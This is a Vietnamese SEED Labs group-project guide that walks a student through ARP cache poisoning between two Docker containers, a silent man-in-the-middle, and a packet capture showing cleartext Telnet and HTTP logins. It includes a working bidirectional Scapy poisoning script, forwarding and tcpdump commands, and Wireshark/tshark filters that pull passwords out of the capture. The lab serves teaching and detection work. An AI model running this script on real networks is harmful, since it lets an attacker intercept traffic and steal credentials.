# NGƯỜI 1 — HƯỚNG DẪN CHI TIẾT: TẤN CÔNG & XUẤT PCAP

> **Nhiệm vụ của bạn:** đầu độc ARP cache → chèn mình vào giữa (MITM) → khiến nạn nhân đăng nhập **Telnet** và **HTTP** → bắt được **file PCAP** chứng minh username/password lộ **cleartext**. Đây là bằng chứng cốt lõi mà Người 2 và Người 3 phụ thuộc vào → **làm sớm nhất**.
>
> **Điều kiện tiên quyết:** đã hoàn thành `GUIDE_CAI_SEED.md` (3 container chạy, attacker ping được A và B).
>
> ⚠️ Toàn bộ thực hiện trong môi trường **SEED Docker cô lập** phục vụ học tập — không chạy trên mạng thật.

---

## Sơ đồ tấn công

```
TRƯỚC:   A (10.9.0.5) <───────────────> B (10.9.0.6)

SAU khi đầu độc ARP cache:
         A (10.9.0.5) ──┐           ┌── B (10.9.0.6)
                        ▼           ▼
                   M (10.9.0.105, kẻ tấn công — thấy toàn bộ lưu lượng)
```
A tưởng "MAC của B" là MAC của M. B tưởng "MAC của A" là MAC của M. Mọi gói A↔B đi vòng qua M.

---

## BƯỚC 0 — Ghi nhận trạng thái sạch (bằng chứng "trước")

Mở shell vào **Host A** và **Host B**, chụp bảng ARP sạch:

```bash
# Trên Host A:
docksh <id hostA>
arp -n          # CHỤP ẢNH: ghi nhận MAC thật của 10.9.0.6

# Trên Host B:
docksh <id hostB>
arp -n          # CHỤP ẢNH: ghi nhận MAC thật của 10.9.0.5
```

→ Lưu 2 ảnh vào `2. Evidence/buoi1/` với tên rõ ràng (vd `arp_A_truoc.png`, `arp_B_truoc.png`).

---

## BƯỚC 1 — Script đầu độc ARP cache (Scapy)

Tạo file trên **máy host** tại `~/seed-arp/Labsetup/volumes/arp_poison.py` (sẽ thấy trong container ở `/volumes/`):

```python
#!/usr/bin/env python3
# arp_poison.py — đầu độc ARP cache 2 chiều để MITM giữa A và B
from scapy.all import ARP, Ether, sendp, getmacbyip, get_if_hwaddr
import time, sys

IFACE = "eth0"            # đổi nếu 'ip addr' cho tên khác
IP_A  = "10.9.0.5"
IP_B  = "10.9.0.6"

MAC_M = get_if_hwaddr(IFACE)          # MAC của kẻ tấn công (M)
MAC_A = getmacbyip(IP_A)              # MAC thật của A
MAC_B = getmacbyip(IP_B)             # MAC thật của B

print(f"[*] M  MAC = {MAC_M}")
print(f"[*] A  {IP_A} -> {MAC_A}")
print(f"[*] B  {IP_B} -> {MAC_B}")
print("[*] Bắt đầu đầu độc (Ctrl+C để dừng)...")

# Gói nói dối gửi tới B: 'IP của A nằm ở MAC của M'
pkt_to_B = Ether(dst=MAC_B) / ARP(op=2, psrc=IP_A, hwsrc=MAC_M, pdst=IP_B, hwdst=MAC_B)
# Gói nói dối gửi tới A: 'IP của B nằm ở MAC của M'
pkt_to_A = Ether(dst=MAC_A) / ARP(op=2, psrc=IP_B, hwsrc=MAC_M, pdst=IP_A, hwdst=MAC_A)

try:
    while True:
        sendp(pkt_to_B, iface=IFACE, verbose=0)
        sendp(pkt_to_A, iface=IFACE, verbose=0)
        time.sleep(2)     # gửi lại mỗi 2s để ghi đè cache liên tục
except KeyboardInterrupt:
    print("\n[*] Dừng đầu độc.")
    sys.exit(0)
```

> **Giải thích:** dùng ARP reply (`op=2`) gửi lặp lại mỗi 2 giây để liên tục ghi đè cache của nạn nhân. Đây là biến thể "ARP reply" trong Task 1 của SEED, kết hợp cả 2 chiều để tạo MITM.

---

## BƯỚC 2 — Bật chuyển tiếp gói (giữ kết nối sống)

Để A và B vẫn liên lạc được (nếu không mạng sẽ đứt và nạn nhân nghi ngờ), M phải **chuyển tiếp** gói giữa hai bên. Trong container **attacker**:

```bash
sysctl -w net.ipv4.ip_forward=1     # bật IP forwarding trên M
cat /proc/sys/net/ipv4/ip_forward   # phải trả về 1
```

> Nhờ forwarding, M nhận gói của A rồi đẩy sang B (và ngược lại). M nằm giữa, thấy hết, nhưng A↔B vẫn "thông" → tấn công âm thầm (silent MITM). Đây là lý do nạn nhân không phát hiện ngay — một điểm quan trọng để phân tích trong báo cáo IR.

---

## BƯỚC 3 — Bắt đầu bắt PCAP

Mở **một shell attacker khác** (giữ nguyên các shell đang chạy), bắt toàn bộ lưu lượng:

```bash
# Trong container attacker:
tcpdump -i eth0 -w /volumes/arp_mitm.pcap -v
# (để chạy — KHÔNG Ctrl+C cho đến khi đã sinh xong traffic ở bước 5)
```

---

## BƯỚC 4 — Chạy đầu độc & xác minh

Trong container attacker, chạy script:

```bash
cd /volumes
python3 arp_poison.py
# giữ chạy
```

**Xác minh poisoning thành công** — sang Host A và Host B kiểm tra lại ARP:

```bash
# Trên Host A:
arp -n     # 10.9.0.6 bây giờ trỏ về MAC của M  -> CHỤP ẢNH arp_A_sau.png
# Trên Host B:
arp -n     # 10.9.0.5 bây giờ trỏ về MAC của M  -> CHỤP ẢNH arp_B_sau.png
```

> ✅ Nếu MAC của 10.9.0.6 (trên A) và 10.9.0.5 (trên B) đều **trùng MAC của M** → đầu độc thành công. So sánh ảnh "trước/sau" là bằng chứng mạnh.

---

## BƯỚC 5 — Sinh lưu lượng chứa credential (phần tạo bằng chứng cleartext)

### 5A. Telnet (cleartext có sẵn trong SEED)

Trên **Host A**, đăng nhập telnet vào B:

```bash
# Trên Host A:
telnet 10.9.0.6
# Đăng nhập tài khoản SEED mặc định:
#   login: seed
#   password: dees
# Sau khi vào, gõ vài lệnh (vd: ls, whoami) rồi 'exit'
```

Username `seed` và password `dees` sẽ truyền **không mã hóa** → M bắt được.

### 5B. HTTP (nhóm tự thêm — chứng minh form login lộ mật khẩu)

Tạo server login tối giản trên **máy host** tại `~/seed-arp/Labsetup/volumes/login_server.py`:

```python
#!/usr/bin/env python3
# login_server.py — web server tối giản có form đăng nhập (chạy trên Host B)
from http.server import BaseHTTPRequestHandler, HTTPServer

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(b"<form method='POST' action='/login'>"
                         b"User: <input name='username'> "
                         b"Pass: <input name='password' type='password'> "
                         b"<input type='submit'></form>")
    def do_POST(self):
        n = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(n).decode()
        print("[LOGIN nhận được]:", body)
        self.send_response(200); self.end_headers()
        self.wfile.write(b"OK: " + body.encode())

HTTPServer(("0.0.0.0", 8080), H).serve_forever()
```

Chạy server trên **Host B**:
```bash
# Trên Host B:
cd /volumes
python3 login_server.py
```

Gửi đăng nhập từ **Host A** (mô phỏng người dùng nhập form):
```bash
# Trên Host A:
curl -d "username=admin&password=SecretP@ss123" http://10.9.0.6:8080/login
```

Chuỗi `username=admin&password=SecretP@ss123` truyền cleartext qua HTTP → M bắt được trong PCAP.

---

## BƯỚC 6 — Dừng bắt & lưu bằng chứng

```bash
# Shell đang chạy tcpdump: Ctrl+C
# Shell đang chạy arp_poison.py: Ctrl+C
```

File `~/seed-arp/Labsetup/volumes/arp_mitm.pcap` đã sẵn sàng. Copy vào thư mục đồ án:

```bash
cp ~/seed-arp/Labsetup/volumes/arp_mitm.pcap \
   "/mnt/c/Users/Admin/Downloads/PWSUCO_N03-20261103T014901Z-1-001/PWSUCO_N03/3. Source/pcap/"
cp ~/seed-arp/Labsetup/volumes/arp_poison.py \
   ~/seed-arp/Labsetup/volumes/login_server.py \
   "/mnt/c/Users/Admin/Downloads/PWSUCO_N03-20261103T014901Z-1-001/PWSUCO_N03/3. Source/scripts/"
```

---

## BƯỚC 7 — Kiểm chứng nhanh PCAP đã chứa credential (để không bàn giao thiếu)

Mở `arp_mitm.pcap` bằng Wireshark (hoặc dòng lệnh) và kiểm tra:

**Telnet — xem mật khẩu cleartext:**
- Lọc: `telnet`
- Chuột phải một gói telnet → **Follow → TCP Stream** → sẽ thấy `seed` / `dees` hiện ra trong luồng.

**HTTP — xem POST login:**
- Lọc: `http.request.method == "POST"`
- Mở gói POST → xem phần **HTML Form URL Encoded** → thấy `username=admin`, `password=SecretP@ss123`.

**Bằng chứng ARP poisoning trong chính PCAP:**
- Lọc: `arp` → thấy hàng loạt ARP reply từ MAC của M khẳng định sở hữu cả hai IP → dấu hiệu kinh điển của ARP spoofing (dùng cho phần Detection của Người 3).

Dòng lệnh nhanh (tùy chọn, nếu có `tshark`):
```bash
tshark -r arp_mitm.pcap -Y 'http.request.method=="POST"' -T fields -e http.file_data
tshark -r arp_mitm.pcap -Y 'telnet'
```

---

## BƯỚC 8 — Khôi phục (tùy chọn, cho đẹp quy trình)

Để trả ARP cache về sạch sau khi xong (thể hiện tính "có trách nhiệm" của lab):

```bash
# Tắt forwarding trên M:
sysctl -w net.ipv4.ip_forward=0
# Trên A và B có thể xóa cache: ip neigh flush all   (hoặc chờ cache hết hạn)
```

---

## CHECKLIST BÀN GIAO (Người 1 → Người 2 & Người 3)

Bàn giao **kèm chú thích** để giảm tải cho Người 3:

- [ ] `arp_mitm.pcap` nằm trong `3. Source/pcap/`.
- [ ] `arp_poison.py` + `login_server.py` trong `3. Source/scripts/`.
- [ ] 4 ảnh ARP: A trước/sau, B trước/sau trong `2. Evidence/buoi1/`.
- [ ] Ghi chú kèm theo (file text ngắn): **mốc thời gian** lúc telnet login, lúc POST HTTP, và **số thứ tự gói (frame number)** quan trọng trong PCAP → Người 3 nhảy tới đúng chỗ ngay.
- [ ] Ảnh chụp Follow TCP Stream telnet (thấy seed/dees) và POST HTTP (thấy password) — bằng chứng "đinh" của báo cáo.

---

## Lưu ý & xử lý sự cố

| Vấn đề | Xử lý |
|---|---|
| `getmacbyip` trả về `None` | Ping A/B trước cho ARP cache của M có sẵn MAC, rồi chạy lại script |
| A↔B mất kết nối sau khi đầu độc | Chưa bật `ip_forward=1` trên M, hoặc script dừng → bật lại & giữ script chạy |
| ARP cache nạn nhân không đổi | Interface sai (không phải `eth0`) → `ip addr` lấy đúng tên; hoặc tăng tần suất gửi (giảm `sleep`) |
| `telnet` không có trên Host A | Cài trong container: `apt update && apt install -y telnet` (SEED thường có sẵn) |
| PCAP quá to | Giới hạn thời gian bắt, hoặc lọc `tcpdump -i eth0 'host 10.9.0.5 or host 10.9.0.6'` |

→ Sau khi hoàn thành, báo lại cho Minh để chuyển sang phần Người 2 (phòng chống) và Người 3 (phân tích).
